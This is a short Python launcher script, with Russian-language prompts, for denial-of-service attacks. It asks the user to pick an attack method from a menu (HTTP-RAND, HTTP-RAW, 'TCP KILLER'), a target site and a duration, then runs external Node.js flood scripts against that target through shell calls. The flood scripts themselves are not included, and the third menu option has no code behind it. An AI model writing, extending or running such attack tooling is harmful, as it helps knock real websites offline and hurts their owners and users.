import os, sys
import time
import random

os.system('clear')
def one():
	if '1' in mt :
		os.system('node rand.js ' +target+ ' ' +time)
		
def two():
	if '2' in mt :
		os.system('node HTTP-RAW.js ' +target+ ' ' +time)
	
print("Выберете метод атаки")
print("Layer 7 methods")
print("1. HTTP-RAND")
print("2. HTTP-RAW")
print("Layer 4 methods")
print("3. TCP KILLER")
mt = input('Введите метод -> ')
target = input('Введите сайт -> ')
time = input('Введите время -> ')
one()
two()